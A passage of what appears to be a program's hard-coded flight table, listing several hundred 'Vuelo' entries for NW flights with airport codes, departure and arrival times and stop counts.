    Vuelo(""NW"", 583, ""BOS"", 12, 15, ""SEA"", 17, 14, 1),
    Vuelo(""NW"", 133, ""ORD"", 13, 0, ""MSP"", 14, 20, 0),
    Vuelo(""NW"", 7, ""MSP"", 9, 25, ""SEA"", 11, 0, 0),
    Vuelo(""NW"", 111, ""DCA"", 7, 0, ""MSP"", 14, 5, 0),
    Vuelo(""NW"", 532, ""ORD"", 12, 0, ""DTW"", 14, 15, 0),
    Vuelo(""NW"", 191, ""SEA"", 18, 30, ""LAX"", 11, 0, 0),
    Vuelo(""NW"", 823, ""ATL"", 8, 20, ""HOU"", 10, 57, 1),
    Vuelo(""NW"", 309, ""MSP"", 19, 45, ""LAX"", 11, 40, 0),
    Vuelo(""NW"", 122, ""MSP"", 8, 0, ""ORD"", 12, 0, 0),
    Vuelo(""NW"", 44, ""LAX"", 11, 25, ""MSP"", 16, 56, 0),
    Vuelo(""NW"", 453, ""MSP"", 12, 0, ""MSY"", 16, 5, 1),
    Vuelo(""NW"", 200, ""ORD"", 7, 25, ""PHL"", 11, 52, 1),
    Vuelo(""NW"", 121, ""ORD"", 7, 0, ""MSP"", 12, 7, 0),
    Vuelo(""NW"", 359, ""MSP"", 19, 40, ""SFO"", 11, 41, 0),
    Vuelo(""NW"", 565, ""MSP"", 14, 25, ""DEN"", 15, 26, 0),
    Vuelo(""NW"", 593, ""MSP"", 13, 5, ""STL"", 14, 37, 0),
    Vuelo(""NW"", 490, ""ATL"", 16, 0, ""DTW"", 17, 49, 0),
    Vuelo(""NW"", 562, ""DEN"", 9, 30, ""ATL"", 16, 30, 1),
    Vuelo(""NW"", 409, ""MSP"", 19, 40, ""DFW"", 12, 8, 0),
    Vuelo(""NW"", 333, ""DTW"", 9, 25, ""LAX"", 11, 30, 0),
    Vuelo(""NW"", 755, ""DTW"", 20, 50, ""MSP"", 11, 42, 0),
    Vuelo(""NW"", 753, ""DTW"", 19, 0, ""MSP"", 10, 4, 0),
    Vuelo(""NW"", 578, ""SEA"", 8, 45, ""DTW"", 15, 53, 0),
    Vuelo(""NW"", 35, ""BOS"", 16, 0, ""JFK"", 17, 17, 0),
    Vuelo(""NW"", 322, ""MSP"", 18, 5, ""DCA"", 11, 21, 0),
    Vuelo(""NW"", 140, ""ORD"", 19, 0, ""DTW"", 11, 15, 0),
    Vuelo(""NW"", 105, ""MSP"", 14, 35, ""PHX"", 16, 52, 0),
    Vuelo(""NW"", 332, ""LAX"", 8, 20, ""DTW"", 15, 40, 0),
    Vuelo(""NW"", 234, ""DTW"", 13, 35, ""DCA"", 14, 59, 0),
    Vuelo(""NW"", 795, ""DTW"", 18, 45, ""ATL"", 10, 41, 0),
    Vuelo(""NW"", 330, ""LAX"", 7, 10, ""DTW"", 14, 28, 0),
    Vuelo(""NW"", 12, ""DTW"", 16, 40, ""DCA"", 18, 7, 0),
    Vuelo(""NW"", 140, ""MSP"", 17, 0, ""DTW"", 11, 15, 1),
    Vuelo(""NW"", 491, ""DTW"", 7, 15, ""ATL"", 11, 5, 0),
    Vuelo(""NW"", 340, ""SFO"", 8, 10, ""PHL"", 18, 15, 1),
    Vuelo(""NW"", 330, ""LAX"", 7, 10, ""BOS"", 17, 3, 1),
    Vuelo(""NW"", 109, ""ORD"", 20, 0, ""MSP"", 11, 29, 0),
    Vuelo(""NW"", 695, ""PVD"", 15, 55, ""DFW"", 11, 3, 1),
    Vuelo(""NW"", 271, ""DTW"", 9, 30, ""HOU"", 11, 46, 0),
    Vuelo(""NW"", 340, ""SFO"", 8, 10, ""DTW"", 15, 35, 0),
    Vuelo(""NW"", 350, ""SFO"", 7, 0, ""MSP"", 12, 30, 0),
    Vuelo(""NW"", 551, ""DCA"", 7, 5, ""LAX"", 11, 35, 1),
    Vuelo(""NW"", 568, ""DEN"", 11, 0, ""MSP"", 13, 45, 0),
    Vuelo(""NW"", 308, ""LAX"", 14, 30, ""MSP"", 19, 50, 0),
    Vuelo(""NW"", 581, ""DTW"", 19, 0, ""SEA"", 10, 56, 0),
    Vuelo(""NW"", 482, ""DTW"", 18, 55, ""TPA"", 11, 34, 0),
    Vuelo(""NW"", 999, ""DTW"", 18, 40, ""MIA"", 11, 42, 0),
    Vuelo(""NW"", 347, ""DTW"", 18, 55, ""SFO"", 11, 5, 0),
    Vuelo(""NW"", 165, ""DTW"", 9, 10, ""ORD"", 12, 0, 0),
    Vuelo(""NW"", 337, ""DCA"", 13, 0, ""DTW"", 14, 35, 0),
    Vuelo(""NW"", 594, ""STL"", 15, 30, ""MSP"", 17, 9, 0),
    Vuelo(""NW"", 46, ""SEA"", 7, 0, ""MSP"", 12, 10, 0),
    Vuelo(""NW"", 297, ""DTW"", 18, 50, ""MSY"", 11, 47, 1),
    Vuelo(""NW"", 802, ""DEN"", 10, 0, ""BNA"", 14, 42, 1),
    Vuelo(""NW"", 310, ""LAX"", 16, 15, ""MSP"", 11, 36, 0),
    Vuelo(""NW"", 759, ""ATL"", 9, 0, ""MSP"", 10, 32, 0),
    Vuelo(""NW"", 583, ""DTW"", 15, 20, ""SEA"", 17, 14, 0),
    Vuelo(""NW"", 516, ""DFW"", 6, 30, ""MSP"", 13, 6, 0),
    Vuelo(""NW"", 170, ""ORD"", 13, 30, ""DTW"", 15, 46, 0),
    Vuelo(""NW"", 583, ""BOS"", 12, 15, ""DTW"", 14, 30, 0),
    Vuelo(""NW"", 308, ""LAX"", 14, 30, ""DTW"", 13, 29, 1),
    Vuelo(""NW"", 386, ""DTW"", 13, 40, ""BOS"", 15, 30, 0),
    Vuelo(""NW"", 252, ""PHX"", 15, 0, ""DTW"", 10, 51, 0),
    Vuelo(""NW"", 839, ""DTW"", 12, 10, ""SEA"", 14, 10, 0),
    Vuelo(""NW"", 386, ""ORD"", 10, 25, ""BOS"", 15, 30, 1),
    Vuelo(""NW"", 696, ""DFW"", 16, 0, ""DTW"", 19, 28, 0),
    Vuelo(""NW"", 400, ""DFW"", 8, 30, ""MSP"", 10, 38, 0),
    Vuelo(""NW"", 358, ""SFO"", 16, 15, ""MSP"", 11, 39, 0),
    Vuelo(""NW"", 351, ""MSP"", 9, 20, ""SFO"", 11, 24, 0),
    Vuelo(""NW"", 8, ""SEA"", 11, 40, ""MSP"", 16, 46, 0),
    Vuelo(""NW"", 779, ""BOS"", 16, 30, ""MIA"", 11, 17, 1),
    Vuelo(""NW"", 233, ""DCA"", 11, 0, ""DTW"", 12, 39, 0),
    Vuelo(""NW"", 374, ""MSP"", 13, 15, ""DTW"", 15, 59, 0),
    Vuelo(""NW"", 760, ""MSP"", 7, 45, ""ATL"", 11, 13, 0),
    Vuelo(""NW"", 205, ""PHL"", 12, 45, ""ORD"", 15, 25, 1),
    Vuelo(""NW"", 481, ""TPA"", 10, 0, ""DTW"", 12, 49, 0),
    Vuelo(""NW"", 156, ""SEA"", 14, 35, ""MSP"", 19, 40, 0),
    Vuelo(""NW"", 498, ""ATL"", 17, 55, ""PVD"", 11, 59, 1),
    Vuelo(""NW"", 466, ""STL"", 13, 35, ""DTW"", 16, 3, 0),
    Vuelo(""NW"", 475, ""ORD"", 17, 0, ""MSY"", 10, 46, 1),
    Vuelo(""NW"", 106, ""PHX"", 15, 45, ""DCA"", 13, 39, 1),
    Vuelo(""NW"", 303, ""BOS"", 8, 15, ""LAX"", 13, 28, 1),
    Vuelo(""NW"", 995, ""DTW"", 9, 10, ""MIA"", 12, 15, 0),
    Vuelo(""NW"", 407, ""MSP"", 18, 0, ""DFW"", 10, 31, 0),
    Vuelo(""NW"", 747, ""DTW"", 15, 10, ""MSP"", 15, 58, 0),
    Vuelo(""NW"", 338, ""LAX"", 23, 0, ""DCA"", 14, 6, 1),
    Vuelo(""NW"", 559, ""MSP"", 7, 45, ""DEN"", 15, 0, 0),
    Vuelo(""NW"", 356, ""SFO"", 14, 30, ""MSP"", 19, 55, 0),
    Vuelo(""NW"", 323, ""DCA"", 18, 30, ""MSP"", 10, 15, 0),
    Vuelo(""NW"", 391, ""DTW"", 19, 0, ""PHX"", 11, 23, 0),
    Vuelo(""NW"", 485, ""TPA"", 18, 30, ""DTW"", 11, 6, 0),
    Vuelo(""NW"", 367, ""DTW"", 15, 20, ""STL"", 16, 4, 0),
    Vuelo(""NW"", 101, ""DTW"", 7, 30, ""PHX"", 11, 56, 1),
    Vuelo(""NW"", 498, ""ATL"", 17, 55, ""DTW"", 19, 45, 0),
    Vuelo(""NW"", 158, ""SEA"", 1, 0, ""MSP"", 10, 5, 0),
    Vuelo(""NW"", 472, ""HOU"", 11, 40, ""MSP"", 17, 29, 2),
    Vuelo(""NW"", 302, ""LAX"", 7, 0, ""DCA"", 16, 25, 1),
    Vuelo(""NW"", 996, ""MIA"", 12, 30, ""DTW"", 15, 33, 0),
    Vuelo(""NW"", 404, ""DFW"", 16, 25, ""MSP"", 18, 37, 0),
    Vuelo(""NW"", 154, ""SEA"", 16, 55, ""MSP"", 12, 0, 0),
    Vuelo(""NW"", 108, ""PHX"", 18, 0, ""MSP"", 11, 51, 0),
    Vuelo(""NW"", 182, ""SFO"", 8, 0, ""BOS"", 16, 33, 0),
    Vuelo(""NW"", 273, ""DTW"", 12, 25, ""HOU"", 14, 44, 0),
    Vuelo(""NW"", 575, ""BOS"", 6, 25, ""DTW"", 13, 5, 0),
    Vuelo(""NW"", 47, ""MSP"", 19, 45, ""SEA"", 11, 25, 0),
    Vuelo(""NW"", 985, ""BOS"", 16, 30, ""ORD"", 18, 25, 0),
    Vuelo(""NW"", 171, ""DTW"", 16, 35, ""ORD"", 16, 50, 0),
    Vuelo(""NW"", 575, ""DTW"", 9, 25, ""SEA"", 11, 26, 0),
    Vuelo(""NW"", 236, ""DTW"", 15, 15, ""DCA"", 16, 40, 0),
    Vuelo(""NW"", 339, ""DCA"", 19, 15, ""DTW"", 10, 58, 0),
    Vuelo(""NW"", 448, ""MSP"", 18, 5, ""TPA"", 12, 5, 0),
    Vuelo(""NW"", 136, ""MSP"", 15, 0, ""ORD"", 16, 19, 0),
    Vuelo(""NW"", 107, ""MSP"", 19, 25, ""PHX"", 11, 49, 0),
    Vuelo(""NW"", 743, ""DTW"", 9, 25, ""MSP"", 10, 21, 0),
    Vuelo(""NW"", 141, ""ORD"", 17, 0, ""MSP"", 18, 35, 0),
    Vuelo(""NW"", 51, ""DTW"", 19, 0, ""LAX"", 11, 0, 0),
    Vuelo(""NW"", 406, ""DFW"", 17, 50, ""MSP"", 19, 59, 0),
    Vuelo(""NW"", 492, ""ATL"", 6, 40, ""DTW"", 12, 9, 0),
    Vuelo(""NW"", 47, ""BOS"", 16, 25, ""MSP"", 18, 45, 0),
    Vuelo(""NW"", 46, ""SEA"", 7, 0, ""BOS"", 16, 53, 1),
    Vuelo(""NW"", 992, ""MIA"", 8, 30, ""DTW"", 11, 36, 0),
    Vuelo(""NW"", 211, ""PHL"", 19, 10, ""DTW"", 11, 0, 0),
    Vuelo(""NW"", 573, ""MIA"", 16, 0, ""MSP"", 18, 50, 0),
    Vuelo(""NW"", 8, ""MSP"", 18, 0, ""PHL"", 11, 20, 0),
    Vuelo(""NW"", 998, ""MIA"", 18, 10, ""DTW"", 11, 10, 0),
    Vuelo(""NW"", 5, ""MIA"", 8, 0, ""MSP"", 10, 45, 0),
    Vuelo(""NW"", 4, ""ORD"", 16, 0, ""BOS"", 19, 9, 0),
    Vuelo(""NW"", 595, ""MSP"", 14, 45, ""STL"", 16, 20, 0),
    Vuelo(""NW"", 202, ""DTW"", 13, 35, ""PHL"", 15, 1, 0),
    Vuelo(""NW"", 123, ""DTW"", 7, 0, ""ORD"", 11, 4, 0),
    Vuelo(""NW"", 941, ""MIA"", 12, 55, ""ORD"", 16, 37, 1),
    Vuelo(""NW"", 124, ""MSP"", 9, 0, ""ORD"", 10, 9, 0),
    Vuelo(""NW"", 564, ""DEN"", 13, 30, ""MSP"", 16, 18, 0),
    Vuelo(""NW"", 128, ""MSP"", 11, 0, ""ORD"", 12, 15, 0),
    Vuelo(""NW"", 115, ""DTW"", 8, 0, ""ORD"", 11, 6, 0),
    Vuelo(""NW"", 361, ""BOS"", 19, 25, ""MSP"", 11, 39, 0),
    Vuelo(""NW"", 338, ""LAX"", 23, 0, ""DTW"", 11, 0, 0),
    Vuelo(""NW"", 356, ""SFO"", 14, 30, ""BOS"", 12, 12, 1),
    Vuelo(""NW"", 190, ""LAX"", 15, 0, ""SEA"", 17, 40, 0),
    Vuelo(""NW"", 45, ""MSP"", 18, 15, ""LAX"", 10, 11, 0),
    Vuelo(""NW"", 47, ""BOS"", 16, 25, ""SEA"", 11, 25, 1),
    Vuelo(""NW"", 28, ""SFO"", 12, 45, ""TPA"", 12, 25, 1),
    Vuelo(""NW"", 454, ""MSY"", 17, 30, ""MSP"", 11, 40, 1),
    Vuelo(""NW"", 463, ""DTW"", 12, 15, ""STL"", 12, 57, 0),
    Vuelo(""NW"", 932, ""DTW"", 10, 25, ""BOS"", 12, 15, 0),
    Vuelo(""NW"", 764, ""MSP"", 18, 10, ""ATL"", 11, 38, 0),
    Vuelo(""NW"", 599, ""MSP"", 21, 0, ""STL"", 12, 25, 0),
    Vuelo(""NW"", 752, ""MSP"", 15, 0, ""DTW"", 17, 41, 0),
    Vuelo(""NW"", 123, ""DTW"", 7, 0, ""MSP"", 12, 0, 1),
    Vuelo(""NW"", 115, ""DTW"", 8, 0, ""MSP"", 10, 27, 1),
    Vuelo(""NW"", 707, ""STL"", 7, 0, ""MSP"", 13, 0, 0),
    Vuelo(""NW"", 697, ""DTW"", 21, 40, ""DFW"", 13, 42, 0),
    Vuelo(""NW"", 119, ""ORD"", 6, 0, ""MSP"", 11, 5, 0),
    Vuelo(""NW"", 709, ""BNA"", 16, 20, ""MSP"", 18, 34, 0),
    Vuelo(""NW"", 994, ""MIA"", 14, 50, ""DTW"", 17, 48, 0),
    Vuelo(""NW"", 106, ""MSP"", 20, 30, ""DCA"", 13, 39, 0),
    Vuelo(""NW"", 300, ""LAX"", 1, 30, ""MSP"", 15, 5, 0),
    Vuelo(""NW"", 757, ""DTW"", 22, 0, ""MSP"", 12, 52, 0),
    Vuelo(""NW"", 940, ""STL"", 17, 50, ""MIA"", 12, 55, 1),
    Vuelo(""NW"", 204, ""DTW"", 15, 20, ""PHL"", 16, 47, 0),
    Vuelo(""NW"", 562, ""DEN"", 9, 30, ""MSP"", 12, 20, 0),
    Vuelo(""NW"", 928, ""SFO"", 1, 30, ""MSP"", 10, 0, 0),
    Vuelo(""NW"", 405, ""MSP"", 14, 25, ""DFW"", 16, 50, 0),
    Vuelo(""NW"", 326, ""MSP"", 18, 0, ""BOS"", 11, 35, 0),
    Vuelo(""NW"", 564, ""DEN"", 13, 30, ""DTW"", 19, 44, 1),
    Vuelo(""NW"", 337, ""DTW"", 15, 15, ""LAX"", 17, 27, 0),
    Vuelo(""NW"", 482, ""PHL"", 16, 15, ""TPA"", 11, 34, 1),
    Vuelo(""NW"", 253, ""DTW"", 21, 45, ""PHX"", 12, 2, 0),
    Vuelo(""NW"", 130, ""MSP"", 12, 0, ""ORD"", 13, 14, 0),
    Vuelo(""NW"", 339, ""DTW"", 21, 40, ""LAX"", 13, 48, 0),
    Vuelo(""NW"", 355, ""MSP"", 14, 35, ""SFO"", 16, 36, 0),
    Vuelo(""NW"", 879, ""TPA"", 7, 45, ""DTW"", 12, 37, 1),
    Vuelo(""NW"", 394, ""DTW"", 20, 45, ""BOS"", 12, 37, 0),
    Vuelo(""NW"", 985, ""BOS"", 16, 30, ""MSP"", 10, 25, 1),
    Vuelo(""NW"", 101, ""DTW"", 7, 30, ""MSP"", 12, 7, 0),
    Vuelo(""NW"", 750, ""MSP"", 13, 0, ""DTW"", 15, 48, 0),
    Vuelo(""NW"", 210, ""DTW"", 20, 40, ""PHL"", 12, 8, 0),
    Vuelo(""NW"", 862, ""MSY"", 7, 30, ""STL"", 10, 47, 1),
    Vuelo(""NW"", 138, ""MSP"", 16, 0, ""ORD"", 17, 10, 0),
    Vuelo(""NW"", 338, ""DTW"", 7, 20, ""DCA"", 14, 6, 0),
    Vuelo(""NW"", 131, ""ORD"", 12, 0, ""MSP"", 13, 30, 0),
    Vuelo(""NW"", 205, ""PHL"", 12, 45, ""DTW"", 14, 30, 0),
    Vuelo(""NW"", 305, ""MSP"", 14, 35, ""LAX"", 16, 29, 0),
    Vuelo(""NW"", 361, ""MSP"", 22, 30, ""SFO"", 12, 27, 0),
    Vuelo(""NW"", 320, ""MSP"", 7, 55, ""DCA"", 11, 11, 0),
    Vuelo(""NW"", 684, ""MSP"", 14, 35, ""PHL"", 17, 56, 0),
    Vuelo(""NW"", 200, ""ORD"", 7, 25, ""DTW"", 14, 1, 0),
    Vuelo(""NW"", 153, ""MSP"", 14, 30, ""SEA"", 16, 5, 0),
    Vuelo(""NW"", 487, ""TPA"", 17, 10, ""DTW"", 19, 51, 0),
    Vuelo(""NW"", 158, ""SEA"", 1, 0, ""ORD"", 11, 4, 1),
    Vuelo(""NW"", 157, ""MSP"", 22, 30, ""SEA"", 12, 2, 0),
    Vuelo(""NW"", 109, ""MSP"", 22, 30, ""PHX"", 12, 47, 0),
    Vuelo(""NW"", 112, ""MSP"", 13, 0, ""ORD"", 14, 16, 0),
    Vuelo(""NW"", 349, ""DTW"", 21, 45, ""SFO"", 13, 51, 0),
    Vuelo(""NW"", 706, ""MSP"", 13, 20, ""BNA"", 15, 19, 0),
    Vuelo(""NW"", 142, ""MSP"", 18, 0, ""ORD"", 19, 24, 0),
    Vuelo(""NW"", 247, ""DTW"", 9, 20, ""PHX"", 11, 46, 0),
    Vuelo(""NW"", 49, ""BOS"", 15, 30, ""DTW"", 17, 50, 0),
    Vuelo(""NW"", 137, ""ORD"", 15, 0, ""MSP"", 16, 20, 0),
    Vuelo(""NW"", 158, ""MSP"", 7, 0, ""ORD"", 11, 4, 0),
    Vuelo(""NW"", 725, ""BOS"", 14, 50, ""MSP"", 17, 8, 0),
    Vuelo(""NW"", 144, ""MSP"", 19, 0, ""ORD"", 10, 15, 0),
    Vuelo(""NW"", 311, ""MSP"", 22, 30, ""LAX"", 12, 28, 0),
    Vuelo(""NW"", 472, ""HOU"", 11, 40, ""ORD"", 15, 20, 1),
    Vuelo(""NW"", 256, ""PHX"", 12, 40, ""DTW"", 11, 7, 0),
    Vuelo(""NW"", 460, ""STL"", 7, 20, ""DTW"", 14, 8, 0),
    Vuelo(""NW"", 403, ""MSP"", 13, 5, ""DFW"", 15, 36, 0),
    Vuelo(""NW"", 294, ""MSY"", 11, 35, ""DTW"", 16, 30, 1),
    Vuelo(""NW"", 563, ""MSP"", 11, 40, ""DEN"", 12, 45, 0),
    Vuelo(""NW"", 161, ""ORD"", 6, 10, ""DTW"", 12, 3, 0),
    Vuelo(""NW"", 109, ""ORD"", 20, 0, ""PHX"", 12, 47, 1),
    Vuelo(""NW"", 174, ""ORD"", 17, 30, ""DTW"", 19, 47, 0),
    Vuelo(""NW"", 564, ""MSP"", 17, 0, ""DTW"", 19, 44, 0),
    Vuelo(""NW"", 337, ""DCA"", 13, 0, ""LAX"", 17, 27, 1),
    Vuelo(""NW"", 339, ""DCA"", 19, 15, ""LAX"", 13, 48, 1),
    Vuelo(""NW"", 231, ""DCA"", 8, 0, ""DTW"", 13, 8, 0),
    Vuelo(""NW"", 597, ""MSP"", 18, 10, ""STL"", 19, 41, 0),
    Vuelo(""NW"", 566, ""DEN"", 17, 5, ""ORD"", 11, 47, 1),
    Vuelo(""NW"", 711, ""DCA"", 17, 15, ""MSP"", 18, 55, 0),
    Vuelo(""NW"", 324, ""MSP"", 14, 30, ""DCA"", 17, 42, 0),
    Vuelo(""NW"", 461, ""DTW"", 9, 20, ""STL"", 10, 5, 0),
    Vuelo(""NW"", 189, ""SEA"", 11, 30, ""LAX"", 13, 58, 0),
    Vuelo(""NW"", 110, ""PHX"", 9, 30, ""MSP"", 13, 31, 0),
    Vuelo(""NW"", 616, ""MSP"", 20, 40, ""ATL"", 13, 59, 0),
    Vuelo(""NW"", 347, ""DCA"", 16, 20, ""DTW"", 18, 5, 0),
    Vuelo(""NW"", 799, ""DTW"", 12, 25, ""ATL"", 14, 23, 0),
    Vuelo(""NW"", 693, ""DTW"", 12, 30, ""DFW"", 14, 38, 0),
    Vuelo(""NW"", 50, ""LAX"", 12, 30, ""DTW"", 19, 45, 0),
    Vuelo(""NW"", 143, ""ORD"", 18, 0, ""MSP"", 19, 31, 0),
    Vuelo(""NW"", 464, ""STL"", 16, 50, ""DTW"", 19, 19, 0),
    Vuelo(""NW"", 560, ""DEN"", 7, 55, ""MSP"", 10, 45, 0),
    Vuelo(""NW"", 560, ""DEN"", 7, 55, ""DCA"", 14, 49, 1),
    Vuelo(""NW"", 46, ""MSP"", 13, 15, ""BOS"", 16, 53, 0),
    Vuelo(""NW"", 3, ""BOS"", 9, 0, ""ORD"", 10, 53, 0),
    Vuelo(""NW"", 196, ""MSP"", 20, 30, ""PHL"", 13, 46, 0),
    Vuelo(""NW"", 880, ""STL"", 11, 55, ""TPA"", 16, 25, 1),
    Vuelo(""NW"", 498, ""DTW"", 20, 25, ""PVD"", 11, 59, 0),
    Vuelo(""NW"", 282, ""SEA"", 12, 30, ""DTW"", 19, 36, 0),
    Vuelo(""NW"", 997, ""DTW"", 12, 10, ""MIA"", 15, 11, 0),
    Vuelo(""NW"", 200, ""DTW"", 10, 25, ""PHL"", 11, 52, 0),
    Vuelo(""NW"", 689, ""PHL"", 19, 50, ""MSP"", 11, 42, 0),
    Vuelo(""NW"", 554, ""LAX"", 13, 0, ""BOS"", 13, 7, 1),
    Vuelo(""NW"", 135, ""ORD"", 14, 0, ""MSP"", 15, 20, 0),
    Vuelo(""NW"", 692, ""DFW"", 12, 20, ""DTW"", 15, 50, 0),
    Vuelo(""NW"", 232, ""DTW"", 10, 25, ""DCA"", 11, 51, 0),
    Vuelo(""NW"", 479, ""DTW"", 12, 15, ""ORD"", 12, 35, 0),
    Vuelo(""NW"", 43, ""BOS"", 17, 0, ""LAX"", 10, 33, 0),
    Vuelo(""NW"", 129, ""ORD"", 11, 0, ""MSP"", 12, 25, 0),
    Vuelo(""NW"", 495, ""DTW"", 10, 30, ""ATL"", 12, 29, 0),
    Vuelo(""NW"", 274, ""HOU"", 16, 15, ""DTW"", 19, 51, 0),
    Vuelo(""NW"", 302, ""MSP"", 13, 15, ""DCA"", 16, 25, 0),
    Vuelo(""NW"", 106, ""PHX"", 15, 45, ""MSP"", 19, 41, 0),
    Vuelo(""NW"", 346, ""SFO"", 23, 0, ""DTW"", 11, 6, 0),
    Vuelo(""NW"", 187, ""BOS"", 17, 30, ""SFO"", 10, 57, 0),
    Vuelo(""NW"", 386, ""ORD"", 10, 25, ""DTW"", 12, 45, 0),
    Vuelo(""NW"", 596, ""STL"", 20, 0, ""MSP"", 11, 31, 0),
    Vuelo(""NW"", 326, ""SFO"", 11, 25, ""MSP"", 16, 50, 0),
    Vuelo(""NW"", 592, ""STL"", 10, 45, ""MSP"", 12, 18, 0),
    Vuelo(""NW"", 562, ""MSP"", 13, 0, ""ATL"", 16, 30, 0),
    Vuelo(""NW"", 356, ""MSP"", 20, 45, ""BOS"", 12, 12, 0),
    Vuelo(""NW"", 123, ""ORD"", 8, 0, ""MSP"", 12, 0, 0),
    Vuelo(""NW"", 745, ""DTW"", 12, 35, ""MSP"", 13, 33, 0),
    Vuelo(""NW"", 560, ""MSP"", 11, 35, ""DCA"", 14, 49, 0),
    Vuelo(""NW"", 275, ""DTW"", 18, 50, ""HOU"", 11, 10, 0),
    Vuelo(""NW"", 361, ""BOS"", 19, 25, ""SFO"", 12, 27, 1),
    Vuelo(""NW"", 321, ""DCA"", 15, 35, ""MSP"", 17, 22, 0),
    Vuelo(""NW"", 104, ""PHX"", 14, 30, ""MSP"", 18, 25, 0),
    Vuelo(""NW"", 102, ""PHX"", 13, 5, ""MSP"", 17, 3, 0),
    Vuelo(""NW"", 446, ""MSP"", 13, 15, ""TPA"", 17, 21, 0),
    Vuelo(""NW"", 250, ""DTW"", 20, 35, ""DCA"", 11, 59, 0),
    Vuelo(""NW"", 489, ""TPA"", 19, 15, ""MSP"", 11, 34, 0),
    Vuelo(""NW"", 449, ""TPA"", 16, 25, ""MSP"", 18, 46, 0),
    Vuelo(""NW"", 993, ""DTW"", 10, 30, ""MIA"", 13, 35, 0),
    Vuelo(""NW"", 6, ""MSP"", 13, 0, ""MIA"", 17, 30, 0),
    Vuelo(""NW"", 335, ""DTW"", 12, 25, ""LAX"", 14, 35, 0),
    Vuelo(""NW"", 103, ""MSP"", 11, 40, ""PHX"", 14, 0, 0),
    Vuelo(""NW"", 126, ""MSP"", 10, 0, ""ORD"", 11, 15, 0),
    Vuelo(""NW"", 722, ""MSP"", 11, 40, ""BOS"", 15, 14, 0),
    Vuelo(""NW"", 250, ""PHX"", 13, 50, ""DCA"", 11, 59, 1),
    Vuelo(""NW"", 582, ""SEA"", 23, 30, ""DTW"", 12, 7, 0),
    Vuelo(""NW"", 723, ""BOS"", 11, 25, ""MSP"", 13, 35, 0),
    Vuelo(""NW"", 390, ""ORD"", 16, 0, ""BOS"", 10, 50, 1),
    Vuelo(""NW"", 7, ""PHL"", 7, 0, ""MSP"", 14, 5, 0),
    Vuelo(""NW"", 694, ""DFW"", 17, 5, ""DTW"", 10, 47, 0),
    Vuelo(""NW"", 345, ""DTW"", 15, 20, ""SFO"", 17, 33, 0),
    Vuelo(""NW"", 567, ""MSP"", 19, 35, ""DEN"", 10, 40, 0),
    Vuelo(""NW"", 776, ""MIA"", 14, 0, ""BOS"", 18, 35, 1),
    Vuelo(""NW"", 115, ""ORD"", 9, 0, ""MSP"", 10, 27, 0),
    Vuelo(""NW"", 42, ""LAX"", 10, 35, ""BOS"", 19, 3, 0),
    Vuelo(""NW"", 344, ""SFO"", 13, 40, ""DTW"", 11, 4, 0),
    Vuelo(""NW"", 326, ""SFO"", 11, 25, ""BOS"", 11, 35, 1),
    Vuelo(""NW"", 496, ""ATL"", 12, 50, ""DTW"", 14, 34, 0),
    Vuelo(""NW"", 494, ""ATL"", 9, 50, ""DTW"", 11, 33, 0),
    Vuelo(""NW"", 763, ""ATL"", 12, 0, ""MSP"", 13, 35, 0),
    Vuelo(""NW"", 402, ""DFW"", 11, 15, ""MSP"", 13, 30, 0),
    Vuelo(""NW"", 272, ""HOU"", 12, 25, ""DTW"", 16, 0, 0),
    Vuelo(""NW"", 685, ""PHL"", 11, 45, ""MSP"", 13, 36, 0),
    Vuelo(""NW"", 799, ""PVD"", 9, 30, ""DTW"", 11, 39, 0),
    Vuelo(""NW"", 353, ""MSP"", 11, 30, ""SFO"", 13, 34, 0),
    Vuelo(""NW"", 932, ""LAX"", 2, 15, ""DTW"", 13, 6, 0),
    Vuelo(""NW"", 483, ""TPA"", 13, 15, ""DTW"", 15, 55, 0),
    Vuelo(""NW"", 695, ""PVD"", 15, 55, ""DTW"", 18, 3, 0),
    Vuelo(""NW"", 343, ""DTW"", 12, 20, ""SFO"", 14, 33, 0),
    Vuelo(""NW"", 680, ""MSP"", 7, 40, ""PHL"", 11, 1, 0),
    Vuelo(""NW"", 342, ""SFO"", 12, 20, ""DTW"", 19, 49, 0),
    Vuelo(""NW"", 303, ""MSP"", 11, 35, ""LAX"", 13, 28, 0),
    Vuelo(""NW"", 151, ""MSP"", 11, 45, ""SEA"", 13, 23, 0),
    Vuelo(""NW"", 11, ""DCA"", 9, 45, ""DTW"", 11, 22, 0),
    Vuelo(""NW"", 486, ""DTW"", 20, 45, ""TPA"", 13, 28, 0),
    Vuelo(""NW"", 308, ""MSP"", 20, 50, ""DTW"", 13, 29, 0),
    Vuelo(""NW"", 799, ""PVD"", 9, 30, ""ATL"", 14, 23, 1),
    Vuelo(""NW"", 319, ""DCA"", 12, 0, ""MSP"", 13, 44, 0),
    Vuelo(""NW"", 165, ""DTW"", 9, 10, ""MSP"", 11, 27, 1),
    Vuelo(""NW"", 480, ""DTW"", 12, 30, ""TPA"", 15, 12, 0),
    Vuelo(""NW"", 484, ""DTW"", 8, 0, ""TPA"", 10, 37, 0),
    Vuelo(""NW"", 690, ""DFW"", 8, 0, ""DTW"", 11, 18, 0),
    Vuelo(""NW"", 929, ""DTW"", 9, 30, ""SFO"", 11, 42, 0),
    Vuelo(""NW"", 561, ""MSP"", 9, 20, ""DEN"", 10, 20, 0),
    Vuelo(""NW"", 986, ""SEA"", 7, 5, ""DCA"", 16, 53, 1),
    Vuelo(""NW"", 499, ""DTW"", 16, 40, ""ATL"", 18, 36, 0),
    Vuelo(""NW"", 673, ""ATL"", 7, 10, ""MSP"", 14, 3, 0),
    Vuelo(""NW"", 340, ""DTW"", 16, 40, ""PHL"", 18, 15, 0),
    Vuelo(""NW"", 193, ""BOS"", 6, 35, ""MSP"", 15, 0, 0),
    Vuelo(""NW"", 303, ""BOS"", 8, 15, ""MSP"", 10, 28, 0),
    Vuelo(""NW"", 249, ""DTW"", 12, 30, ""PHX"", 14, 54, 0),
    Vuelo(""NW"", 352, ""SFO"", 8, 20, ""MSP"", 13, 44, 0),
    Vuelo(""NW"", 482, ""PHL"", 16, 15, ""DTW"", 18, 3, 0),
    Vuelo(""NW"", 479, ""TPA"", 8, 55, ""ORD"", 12, 35, 1),
    Vuelo(""NW"", 390, ""ORD"", 16, 0, ""DTW"", 18, 10, 0),
    Vuelo(""NW"", 352, ""SFO"", 8, 20, ""BOS"", 18, 12, 1),
    Vuelo(""NW"", 566, ""DEN"", 17, 5, ""MSP"", 19, 55, 0),
    Vuelo(""NW"", 598, ""STL"", 17, 20, ""MSP"", 18, 55, 0),
    Vuelo(""NW"", 745, ""BOS"", 9, 10, ""MSP"", 13, 33, 1),
